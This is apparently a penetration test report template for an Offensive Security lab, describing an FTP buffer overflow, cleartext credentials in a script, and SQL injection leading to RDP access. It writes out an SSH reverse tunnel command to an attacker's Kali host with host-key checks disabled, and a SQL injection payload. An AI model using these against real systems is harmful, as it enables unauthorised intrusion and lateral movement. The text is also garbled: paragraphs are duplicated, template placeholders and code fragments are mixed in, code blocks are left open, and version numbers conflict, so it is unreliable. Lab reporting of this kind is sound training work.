John Doe was tasked with performing an internal penetration test towards Offensive Security Labs. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Offensive Security’s internal lab systems – the THINC.local domain. John’s overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security.

When performing the internal penetration test, there were several alarming vulnerabilities that were identified on Offensive Security’s network. When performing the attacks, John was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.  During the testing, John had administrative level access to multiple systems. All systems were successfully exploited and access granted.

After collecting the proof files and establishing a backdoor using SSH, John began the enumeration of the filesystem for the presence of interesting files. He noticed that there was a mounted share originating from the 10.5.5.20 IP. Inspecting a custom sysreport.ps1 script in the /mnt/scripts directory he found cleartext credentials for the “sandbox\\alex” user. Taking into consideration the type of scripts in this directory and the username structure, it seems that the “Poultry” host is a part of the Active Directory environment.

John began the lateral movement by establishing a reverse dynamic port forwarding using SSH. First, he generated a new pair of SSH keys and added those to the authorized_keys file on his Kali VM, then he just needed to issue a single SSH port forwarding command:

```
ssh-keygen -t rsa -N ‘’ -f ~/.ssh/key
ssh -f -N -R 1080 -o “UserKnownHostsFile=/dev/null” -o “StrictHostKeyChecking=no” -I key kali@192.168.119.164

**FTP Enumeration**

"""
initialaccess = """
**Vulnerability Explanation:** Ability Server 2.34 is subject to a buffer overflow vulnerability in STOR field. Attackers can use this vulnerability to cause arbitrary remote code execution and take completely control over the system.

**Vulnerability Fix:** The publishers of the Ability Server have issued a patch to fix this known issue. It can be found here: [http://www.code-crafters.com/abilityserver/](http://www.code-crafters.com/abilityserver/)

**Steps to reproduce the attack:** The operating system was different from the known public exploit. A rewritten exploit was needed in order for successful code execution to occur. Once the exploit was rewritten, a targeted attack was performed on the system which gave John full administrative access over the system.

**Vulnerability Explation:** After establishing a foothold on target, John noticed there were several applications running locally, one of them, a custom web application on port 80 was prone to SQL Injection attacks. Using Chisel for port forwarding, John was able to access the web application. When performing the penetration test, John noticed error-based MySQL Injection on the taxid query string parameter. While enumerating table data, John was able to successfully extract the database root account login and password credentials that were unencrypted that also matched username and password accounts for the administrative user account on the system and John was able to log in remotely using RDP. This allowed for a successful breach of the operating system as well as all data contained on the system.

**Vulnerability Fix:** Since this is a custom web application, a specific update will not properly solve this issue. The application will need to be programmed to properly sanitize user-input
data, ensure that the user is running off of a limited user account, and that any sensitive data stored within the SQL database is properly encrypted. Custom error messages are highly recommended, as it becomes more challenging for the attacker to exploit a given weakness if errors are not being presented back to them.

```
SELECT * FROM login WHERE id = 1 or 1=1 AND user LIKE “%root%"

{{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) was tasked with performing an internal penetration test towards Offensive Security Labs. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Offensive Security’s internal lab systems – the THINC.local domain. {{ report.firstname }} {{ report.lastname}}’s ({{ report.osid}}) overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security.

When performing the internal penetration test, there were several alarming vulnerabilities that were identified on Offensive Security’s network. When performing the attacks, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.  During the testing, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) had administrative level access to multiple systems. All systems were successfully exploited and access granted.

**FTP Enumeration**
Upon manual enumeration of the available FTP service, John noticed it was running an outdated version 2.3.4 that is prone to the remote buffer overflow vulnerability.
"""
initialaccess = """
**Vulnerability Explanation:** Ability Server 2.34 is subject to a buffer overflow vulnerability in STOR field. Attackers can use this vulnerability to cause arbitrary remote code execution and take completely control over the system.

**Vulnerability Fix:** The publishers of the Ability Server have issued a patch to fix this known issue. It can be found here: [http://www.code-crafters.com/abilityserver/](http://www.code-crafters.com/abilityserver/)

**Steps to reproduce the attack:** The operating system was different from the known public exploit. A rewritten exploit was needed in order for successful code execution to occur. Once the exploit was rewritten, a targeted attack was performed on the system which gave John full administrative access over the system.

**Vulnerability Explation:** After establishing a foothold on target, John noticed there were several applications running locally, one of them, a custom web application on port 80 was prone to SQL Injection attacks. Using Chisel for port forwarding, John was able to access the web application. When performing the penetration test, John noticed error-based MySQL Injection on the taxid query string parameter. While enumerating table data, John was able to successfully extract the database root account login and password credentials that were unencrypted that also matched username and password accounts for the administrative user account on the system and John was able to log in remotely using RDP. This allowed for a successful breach of the operating system as well as all data contained on the system.

**Vulnerability Fix:** Since this is a custom web application, a specific update will not properly solve this issue. The application will need to be programmed to properly sanitize user-input
data, ensure that the user is running off of a limited user account, and that any sensitive data stored within the SQL database is properly encrypted. Custom error messages are highly recommended, as it becomes more challenging for the attacker to exploit a given weakness if errors are not being presented back to them.

**Steps to reproduce the attack:**
```
SELECT * FROM login WHERE id = 1 or 1=1 AND user LIKE “%root%"
```
